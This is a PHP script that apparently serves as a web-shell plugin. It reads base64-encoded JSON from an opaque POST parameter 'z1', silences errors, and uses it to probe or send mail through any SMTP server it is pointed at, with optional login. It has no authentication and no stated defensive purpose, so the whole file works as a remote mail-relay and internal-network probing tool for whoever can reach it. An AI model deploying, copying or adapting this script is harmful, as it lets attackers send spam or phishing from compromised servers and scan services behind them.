<?php

@error_reporting(0);
header('Content-Type: text/plain; charset=utf-8');

function getJsonValue($json, $key) {
    if (empty($json)) return "";
    if (preg_match('/"' . $key . '"\s*:\s*"(.*?)"/', $json, $matches)) {
        return $matches[1];
    }
    if (preg_match('/"' . $key . '"\s*:\s*([^,\}\\]]+)/', $json, $matches)) {
        return trim(str_replace('"', '', $matches[1]));
    }
    return "";
}

function extractValue($json, $key) {
    if (empty($json)) return "";
    if (preg_match('/"' . $key . '"\s*:\s*"(.*?)"/', $json, $matches)) {
        return $matches[1];
    }
    return "";
}

function readMultilineResponse($socket) {
    $response = "";
    while (($line = fgets($socket, 515)) !== false) {
        $response .= $line;
        if (isset($line[3]) && $line[3] === ' ') {
            break;
        }
    }
    return $response;
}

function processSmtpAction($host, $port, $ssl, $user, $pass, $timeout, $action, $extraData) {
    if (empty($action)) {
        $action = "test";
    }
    $action = strtolower($action);

    $protocol = $ssl ? "ssl://" : "";
    $remoteSocket = "{$protocol}{$host}:{$port}";

    $errno = 0;
    $errstr = "";
    $socket = @fsockopen($remoteSocket, $port, $errno, $errstr, (float)$timeout);

    if (!$socket) {
        return "[-] SMTP Error: Failed to connect to {$host}:{$port} -> {$errstr}";
    }

    stream_set_timeout($socket, $timeout);

    try {
        if ($action === "test") {
            $greeting = fgets($socket, 515);
            fclose($socket);
            if ($greeting === false) $greeting = "";
            return "[+] SUCCESS_SMTP_CONNECTED\nServer Greeting: " . trim($greeting);
        } 
        else if ($action === "send") {
            $from = extractValue($extraData, "from");
            $to = extractValue($extraData, "to");
            $subject = extractValue($extraData, "subject");
            $body = extractValue($extraData, "body");

            if (empty($from)) {
                $from = "admin@local.test";
            }
            if (empty($to)) {
                fclose($socket);
                return "[-] Failed to send: Recipient (to) is empty.";
            }

            // Read banner
            $resp = fgets($socket, 515);
            if ($resp === false || strpos($resp, "220") !== 0) {
                fclose($socket);
                return "[-] SMTP Error: Invalid greeting -> " . trim($resp);
            }

            // EHLO
            fwrite($socket, "EHLO localhost\r\n");
            readMultilineResponse($socket);

            // AUTH
            if (!empty($user) && $pass !== null) {
                fwrite($socket, "AUTH LOGIN\r\n");
                $resp = fgets($socket, 515);
                if (strpos($resp, "334") !== 0) {
                    fclose($socket);
                    return "[-] SMTP Error: AUTH LOGIN failed -> " . trim($resp);
                }

                fwrite($socket, base64_encode($user) . "\r\n");
                $resp = fgets($socket, 515);
                if (strpos($resp, "334") !== 0) {
                    fclose($socket);
                    return "[-] SMTP Error: Username rejected -> " . trim($resp);
                }

                fwrite($socket, base64_encode($pass) . "\r\n");
                $resp = fgets($socket, 515);
                if (strpos($resp, "235") !== 0) {
                    fclose($socket);
                    return "[-] SMTP Error: Authentication failed -> " . trim($resp);
                }
            }

            // MAIL FROM
            fwrite($socket, "MAIL FROM:<{$from}>\r\n");
            $resp = fgets($socket, 515);
            if (strpos($resp, "250") !== 0) {
                fclose($socket);
                return "[-] SMTP Error: MAIL FROM failed -> " . trim($resp);
            }

            // RCPT TO
            fwrite($socket, "RCPT TO:<{$to}>\r\n");
            $resp = fgets($socket, 515);
            if (strpos($resp, "250") !== 0 && strpos($resp, "251") !== 0) {
                fclose($socket);
                return "[-] SMTP Error: RCPT TO failed -> " . trim($resp);
            }

            // DATA
            fwrite($socket, "DATA\r\n");
            $resp = fgets($socket, 515);
            if (strpos($resp, "354") !== 0) {
                fclose($socket);
                return "[-] SMTP Error: DATA command failed -> " . trim($resp);
            }

            // EMail content
            $emailContent  = "From: {$from}\r\n";
            $emailContent .= "To: {$to}\r\n";
            $emailContent .= "Subject: " . ($subject ?? "") . "\r\n";
            $emailContent .= "Content-Type: text/plain; charset=UTF-8\r\n";
            $emailContent .= "\r\n";
            $emailContent .= ($body ?? "") . "\r\n";
            $emailContent .= ".\r\n";

            fwrite($socket, $emailContent);
            $resp = fgets($socket, 515);
            if (strpos($resp, "250") !== 0) {
                fclose($socket);
                return "[-] SMTP Error: Message data rejected -> " . trim($resp);
            }

            // QUIT
            fwrite($socket, "QUIT\r\n");
            fclose($socket);

            return "[+] SUCCESS_MAIL_SENT -> Successfully sent test email to {$to} via {$host}:{$port}";
        } 
        else {
            fclose($socket);
            return "[-] ERROR: Unknown SMTP action.";
        }
    } catch (Exception $ex) {
        if (is_resource($socket)) {
            fclose($socket);
        }
        return "[-] SMTP Error: " . $ex->getMessage();
    }
}

function main() {
    $z1 = $_POST['z1'] ?? '';
    if (empty($z1)) {
        echo "[-] Missing parameter z1";
        return;
    }

    $decoded = base64_decode($z1, true);
    $config_raw = ($decoded !== false && $decoded !== '') ? $decoded : $z1;
    
    $host = getJsonValue($config_raw, "ip");
    if (empty($host)) {
        $host = "127.0.0.1";
    }

    $port = 25;
    $portStr = getJsonValue($config_raw, "port");
    if (!empty($portStr)) {
        $port = (int)$portStr;
    }
    if ($port <= 0) $port = 25;

    $sslStr = getJsonValue($config_raw, "ssl");
    $ssl = filter_var($sslStr, FILTER_VALIDATE_BOOLEAN);

    $user = getJsonValue($config_raw, "user");
    $pass = getJsonValue($config_raw, "pass");
    $action = getJsonValue($config_raw, "action");
    $extraData = getJsonValue($config_raw, "data");

    $timeout = 15;
    $timeoutStr = getJsonValue($config_raw, "timeout");
    if (!empty($timeoutStr)) {
        $timeout = (int)$timeoutStr;
    }
    if ($timeout <= 0) $timeout = 15;

    echo processSmtpAction($host, $port, $ssl, $user, $pass, $timeout, $action, $extraData);
}

main();

?>